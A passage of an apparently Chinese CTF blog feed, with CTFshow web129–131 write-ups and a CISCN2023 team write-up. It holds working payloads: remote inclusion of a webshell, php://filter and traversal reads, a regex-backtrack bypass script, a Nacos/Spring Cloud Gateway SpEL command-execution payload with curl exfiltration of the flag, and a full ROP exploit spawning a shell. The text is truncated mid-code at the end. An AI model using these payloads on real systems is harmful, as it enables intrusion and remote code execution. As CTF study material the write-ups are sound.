src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688274251016-f41af228-5679-445a-967b-315d8677c759.png" alt="image.png"><br>可以借由输出字符串<br>使用<code>f1=_&amp;f2=phpinfo</code>就可以查看到php信息<br>由于题目有<code>include(&#39;flag.php&#39;)</code>可以直接输出所有变量：<br>payload：<code>f1=_&amp;f2=get_defined_vars</code>即可</p><h1 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h1><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/109181768">https://blog.csdn.net/miuzzx/article/details/109181768</a></p></blockquote><h3 id="考点：stripos"><a href="#考点：stripos" class="headerlink" title="考点：stripos"></a>考点：stripos</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688276827328-a519e966-3864-4e99-9157-4cbabe21a2f1.png" alt="image.png"></p><h2 id="方法1-远程文件包含"><a href="#方法1-远程文件包含" class="headerlink" title="方法1 远程文件包含"></a>方法1 远程文件包含</h2><p>一个方法是远程文件包含，在自己的服务器上写一句话木马，然后保存为txt文档，然后如下使用：<br><code>f=http://url/xxx.txt?ctfshow</code><br>测试一下：<br>在根目录写一个一句话木马：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688279012856-b10947c0-ec54-4c88-950a-181dcc097ce8.png" alt="image.png"><br>注意，一定要能访问得到，放在对应www或者wwwroot目录下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688279781611-621b25c1-bd8f-42bd-baac-336ec755e9ca.png" alt="6c4d3974c2ebcc5e4389c8ca31c7cac.png"><br>然后简单测试一下：<br>能够获取到，但是不能够rce<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688280341422-1fa73f65-9741-4958-a762-11660750fdfd.png" alt="image.png"><br>不知道为什么。</p><h2 id="方法2-直接使用伪协议"><a href="#方法2-直接使用伪协议" class="headerlink" title="方法2 直接使用伪协议"></a>方法2 直接使用伪协议</h2><p><code>?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php</code><br>base64解密即可</p><h2 id="方法3-目录穿越"><a href="#方法3-目录穿越" class="headerlink" title="方法3 目录穿越"></a>方法3 目录穿越</h2><p><code>/ctfshow/../../../../var/www/html/flag.php</code></p><h1 id="web130、web131"><a href="#web130、web131" class="headerlink" title="web130、web131"></a>web130、web131</h1><h2 id="考点：pregmatch最大回溯次数绕过"><a href="#考点：pregmatch最大回溯次数绕过" class="headerlink" title="考点：pregmatch最大回溯次数绕过"></a>考点：pregmatch最大回溯次数绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了。<br>直接用python脚本即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&quot;http://44ff0304-988a-4fea-b5a4-4dcd7874d335.challenge.ctf.show/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;very&#x27;</span> * <span class="number">250000</span> + <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;very&#x27;</span>, <span class="string">&#x27;250000&#x27;</span>).<span class="string">&#x27;36Dctfshow&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688281327546-67e6816e-fcde-44ea-819f-e0d4e513075d.png" alt="image.png"><br>除此之外还可直接：<code>f=ctfshow</code>后面接任意字符均可<br>或者使用空数组：<code>f[]=ctfshow</code><br>但是131似乎就只能使用回溯超出做了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2023 wp</title>
      <link href="/2023/05/29/CISCN2023%20wp/"/>
      <url>/2023/05/29/CISCN2023%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="战队答题情况"><a href="#战队答题情况" class="headerlink" title="战队答题情况"></a>战队答题情况</h1><h2 id="排名：282"><a href="#排名：282" class="headerlink" title="排名：282"></a>排名：282</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368785969-9737117c-25d9-4a53-a14f-96b88afe88c2.png" alt="a6f287c23150ba48b360dcc75e6c0b0.png"></p><h2 id="解题列表"><a href="#解题列表" class="headerlink" title="解题列表"></a>解题列表</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><ul><li><p>BackendService </p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3></li><li><p>烧烤摊儿 </p></li><li><p>funcanary </p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3></li><li><p>签到卡 </p></li><li><p>pyshell </p></li><li><p>网络安全人才实战能力评价现状调查问卷 </p><h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3></li><li><p>babyRE </p></li><li><p>ezAndroid </p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3></li><li><p>基于国密SM2算法的密钥密文分发 </p></li><li><p>Sign_in_passwd </p></li></ul><hr><h1 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h1><h2 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h2><p>在nacos权限绕过漏洞，网上找了一个payload<br>nacos抓包，修改返回包中参数，登录<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685266452751-28fda1ed-0ad2-4eee-af5b-1ddf328b434c.png" alt="image.png"><br><a href="https://xz.aliyun.com/t/11493#toc-5">https://xz.aliyun.com/t/11493#toc-5</a><br>对源码进行审计发现springcloud3.05 spel注入漏洞，在新建配置文件，名为backcfg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;spring&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;cloud&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;gateway&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;routes&quot;</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">&quot;exam&quot;</span>,</span><br><span class="line">            <span class="string">&quot;order&quot;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;uri&quot;</span>: <span class="string">&quot;lb:/rvice-provider&quot;</span>,</span><br><span class="line">            <span class="string">&quot;predicates&quot;</span>: [</span><br><span class="line">              <span class="string">&quot;Path=/echo/**&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;filters&quot;</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;args&quot;</span>: &#123;</span><br><span class="line">                  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;result&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;value&quot;</span>: <span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;id&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用curl外带flag即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685268408418-725f086c-ecf3-4b0c-ba3a-ab2b4af493db.png" alt="image.png"></p><h1 id="Pwn-1"><a href="#Pwn-1" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="27日-烧烤摊儿"><a href="#27日-烧烤摊儿" class="headerlink" title="27日_烧烤摊儿"></a>27日_烧烤摊儿</h2><p>本地执行发现买东西是如果输入负数会给自己加钱，然后买下店铺，改名，发现存在栈溢出，试出溢出为0x28，因为是静态，所以用ROPgadget –binary shaokao –ropchain可以获得payload，只需要填偏移即可。<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=remote()</span></span><br><span class="line">io=process(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;-1000000&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000458827</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040264f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a404b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(p))</span><br><span class="line"></span><br><span class="line">io.sendline(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h2><ul><li>利用fork无限创建子进程去爆破出canary，最后利用穷举去partial write从而绕过pie<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 